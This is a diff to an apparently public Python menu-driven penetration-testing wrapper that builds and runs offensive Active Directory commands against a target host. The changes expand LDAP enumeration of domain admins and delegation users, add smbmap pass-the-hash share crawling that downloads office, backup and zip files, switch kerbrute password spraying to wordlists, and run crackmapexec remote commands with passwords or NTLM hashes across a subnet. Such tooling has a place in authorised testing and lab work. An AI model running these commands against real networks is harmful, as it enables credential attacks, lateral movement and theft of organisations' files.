@@ -175,7 +175,7 @@ def display():
       print(colored(DNS[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
    
-   if str(SHAR) == SHAR[0]:
+   if TSH.rstrip(" ") in SHAR[0]:
       print(colored(SHAR[0],colour5), end=' ')
    else:
       print(colored(SHAR[0],colour2), end=' ')
@@ -198,7 +198,7 @@ def display():
       print(colored(TIP[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
    
-   if str(SHAR) == SHAR[1]:
+   if TSH.rstrip(" ") in SHAR[1]:
       print(colored(SHAR[1],colour5), end=' ')
    else:
       print(colored(SHAR[1],colour2), end=' ')
@@ -222,7 +222,7 @@ def display():
       print(colored(POR[:COL1-1],colour2) + colored(lastChar,colour4), end=' ')
    print('\u2551', end=' ')
    
-   if str(SHAR) == SHAR[2]:
+   if TSH.rstrip(" ") in SHAR[2]:
       print(colored(SHAR[2],colour5), end=' ')
    else:
       print(colored(SHAR[2],colour2), end=' ')
@@ -245,7 +245,7 @@ def display():
       print(colored(WEB[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
    
-   if str(SHAR) == SHAR[3]:
+   if TSH.rstrip(" ") in SHAR[3]:
       print(colored(SHAR[3],colour5), end=' ')
    else:
       print(colored(SHAR[3],colour2), end=' ')
@@ -268,7 +268,7 @@ def display():
       print(colored(USR[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
    
-   if str(SHAR) == SHAR[4]:
+   if TSH.rstrip(" ") in SHAR[4]:
       print(colored(SHAR[4],colour5), end=' ')
    else:
       print(colored(SHAR[4],colour2), end=' ')
@@ -291,7 +291,7 @@ def display():
       print(colored(PAS[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
    
-   if str(SHAR) == SHAR[5]:
+   if TSH.rstrip(" ") in SHAR[5]:
       print(colored(SHAR[5],colour5), end=' ')
    else:
       print(colored(SHAR[5],colour2), end=' ')
@@ -314,7 +314,7 @@ def display():
       print(colored(NTM[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
    
-   if str(SHAR) == SHAR[6]:
+   if TSH.rstrip(" ") in SHAR[6]:
       print(colored(SHAR[6],colour5), end=' ')
    else:
       print(colored(SHAR[6],colour2), end=' ')
@@ -337,7 +337,7 @@ def display():
       print(colored(DOM[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
    
-   if str(SHAR) == SHAR[7]:
+   if TSH.rstrip(" ") in SHAR[7]:
       print(colored(SHAR[7],colour5), end=' ')
    else:
       print(colored(SHAR[7],colour2), end=' ')
@@ -360,7 +360,7 @@ def display():
       print(colored(SID[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
    
-   if str(SHAR) == SHAR[8]:
+   if TSH.rstrip(" ") in SHAR[8]:
       print(colored(SHAR[8],colour5), end=' ')
    else:
       print(colored(SHAR[8],colour2), end=' ')
@@ -383,7 +383,7 @@ def display():
       print(colored(TSH[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
    
-   if str(SHAR) == SHAR[9]:
+   if TSH.rstrip(" ") in SHAR[9]:
       print(colored(SHAR[9],colour5), end=' ')
    else:
       print(colored(SHAR[9],colour2), end=' ')
@@ -406,7 +406,7 @@ def display():
       print(colored(LTM[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
    
-   if str(SHAR) == SHAR[10]:
+   if TSH.rstrip(" ") in SHAR[10]:
       print(colored(SHAR[10],colour5), end=' ')
    else:
       print(colored(SHAR[10],colour2), end=' ')
@@ -432,7 +432,7 @@ def display():
    if SHAR[12][:1] != " ":
       print(colored(SHAR[11],'red'), end=' ')
    else:
-      if str(SHAR) == SHAR[10]:
+      if TSH.rstrip(" ") in SHAR[11]:
          print(colored(SHAR[11],colour5), end=' ')
       else:
          print(colored(SHAR[11],colour2), end=' ')
@@ -952,9 +952,9 @@ while True:
          for x in range(0, maximum):
             if USER[x].rstrip(" ") == USR.rstrip(" "):
                NTM = PASS[x] 			# UPDATE HASH VALUE TO MATCH NEW USER.
-               if NTM[:1] == "":
-                  NTM = "''"
-               NTM = spacePadding(NTM, COL1)
+               if (NTM[:1] == "") or (NTM[:1] == "."):
+                  NTM = "EMPTY"
+         NTM = spacePadding(NTM, COL1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1414,7 +1414,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -GUC --da --full.
+# Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -U-GUC --da --full.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1425,8 +1425,34 @@ while True:
          print(colored("[!] WARNING!! Not comptable with IP 6...", colour4))
 
       if checkParams != 1:
-         command(keypath + "windapsearch.py -d " + DOM.rstrip(" ") + " --dc-ip " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -GUC --da --full")
-      prompt()
+      
+         print("[*] Enumerating DNS zones...")
+         command(keypath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -l " + DOM.rstrip(" ") + " --full")
+      
+         print("\n[*] Enumerating domain admins...")
+         command(keypath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --da --full")         
+         
+         print("\n[*] Enumerating admin protected objects...")
+         command(keypath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --admin-objects --full")                  
+         
+         print("\n[*] Enumerating domain users...")
+         command(keypath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U --full")
+         
+         print("\n[*] Enumerating remote management users...")
+         command(keypath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U -m 'Remote Management Users' --full")         
+         
+         print("\n[*] Enumerating users with unconstrained delegation...")
+         command(keypath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --unconstrained-users --full")
+         
+         print("\n[*] Enumerating domain groups...")
+         command(keypath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -G --full")
+         
+         print("\n[*] Enumerating AD computers...")
+         command(keypath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -C --full")
+         
+#         command(keypath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt")         
+         
+      prompt() #  
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1519,26 +1545,6 @@ while True:
 
    if selection =='33':
       checkParams = testTwo(checkParams)
-      
-#      test1 = os.path.getsize("usernames.txt")
-#      test2 = os.path.getsize("hashes.txt") 
-#      
-#      if test1 > 0:
-#         print(colored("[!] WARNING!!! - This command will overwrite the current USERNAMES file..", colour4))
-#         checkParams = 2
-#         
-#      if test2 > 0:
-#         print(colored("[!] WARNING!!! - This command will overwrite the current HASHES file..", colour4))
-#         checkParams = 2
-#         
-#      if checkParams == 2:
-#            testValue = input("[*] Please confirm that you wish to continue [Y] or [N] ")
-#            if testValue == "":
-#               testValue = "N"
-#            if testValue.upper() == "N":
-#               checkParams = 1
-#            else:
-#               checkParms = 0
 
       if checkParams != 1:
          print("[*] Enumerating users, please wait this can take sometime...")
@@ -1722,9 +1728,15 @@ while True:
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
-            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" ") + "R")      
+            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" ") + " -R")      
+            print("\n[+] Downloading any found files...")
+            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A '(xlsx|docx|txt|xml|bak|zip)' -R")
+
          else:
-            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" ") + "R")
+            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" ") + " -R")
+            print("\n[+] Downloading any found files...")
+            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A '(xlsx|docx|txt|xml|bak|zip)' -R")
+
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1884,10 +1896,10 @@ while True:
       
       if checkParams != 1:
          print("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
-         command("kerbrute -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile bpassword1.tmp")
+         command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile password1.tmp")
 
-         test1 = len(open('bpassword1.tmp').readlines())
-         if test1 > 0:
+         test1 = linecache.getline("password1.tmp", 1)
+         if test1 != "":
             found = 1
             USR,PAS = testOne.split(":")
             USR = spacePadding(USR, COL1)
@@ -1895,31 +1907,24 @@ while True:
 
          if found == 0:
             print("\n[*] Now trying all usernames with matching passwords...")
-            command("kerbrute -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile bpassword2.tmp")
+            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile password2.tmp")
          
-         test2 = len(open('bpassword2.tmp').readlines())
-         if test2 > 0:
-            found = 1
-            USR,PAS = testTwo.split(":")
-            USR = spacePadding(USR, COL1)
-            PAS = spacePadding(PAS, COL1)
+            test2 = linecache.getline("password2.tmp", 1)
+            if test2 != "":
+               found = 1
+               USR,PAS = test2.split(":")
+               USR = spacePadding(USR, COL1)
+               PAS = spacePadding(PAS, COL1)
 
          if found == 0:
-            print("\n[*] Now trying all users with random passwords, please wait as this could take sometime...")
-            
-            with open("passwords.txt","r") as read:
-               for line in read:
-                  line = line.rstrip("\n")
-                  if line != "":
-                     command("kerbrute -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + line + " -outputfile bpassword3.tmp > log.tmp") 
+            print("\n[*] Now trying all users against password list, please wait as this could take sometime...")            
+            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords passwords.txt -outputfile password3.tmp > log.tmp") 
                   
-                     test3 = linecache.getline("bpassword3.tmp", 1)
-                     test3 = test3.rstrip("\n")                                    
-                                    
-                     if test3 != "":
-                        USRX,PASX = test3.split(":") 
-                        print("[+] User " + USRX + " has associated password " + PASX + "...")
-                        break
+            test3 = linecache.getline("password3.tmp", 1)
+            if test3 != "":
+               USR,PAS = test3.split(":") 
+               USR = spacePadding(USR, COL1)
+               PAS = spacePadding(PAS, COL1)
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2323,29 +2328,30 @@ while True:
             print("[+] Other exploitable machines on the same subnet...\n")
             command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
          
-            print("[+] Trying specified windows command...\n")
+            print("\n[+] Trying specified windows command...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'whoami /all'")
 
-            print("[+] Trying to enumerate users and shares...\n")  
+            print("\n[+] Trying to enumerate users and shares...\n")  
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
          
-            print("[+] Trying a few other command while I am here...\n")
+            print("\n[+] Trying a few other command while I am here...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'net user Administrator /domain'")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -X '$PSVersionTable'")         
          else:
+            print("[i] Using HASH value as password credential")
             print("[*] Enumerating, please wait...")          
             print("[+] Other exploitable machines on the same subnet...\n")
             command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
          
-            print("[+] Trying specified windows command...\n")
+            print("\n[+] Trying specified windows command...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x 'whoami /all'")
 
-            print("[+] Trying to enumerate users and shares...\n")  
+            print("\n[+] Trying to enumerate users and shares...\n")  
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' --users")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' --shares")
          
-            print("[+] Trying a few other command while I am here...\n")
+            print("\n[+] Trying a few other command while I am here...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x 'net user Administrator /domain'")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -X '$PSVersionTable'")
       prompt()
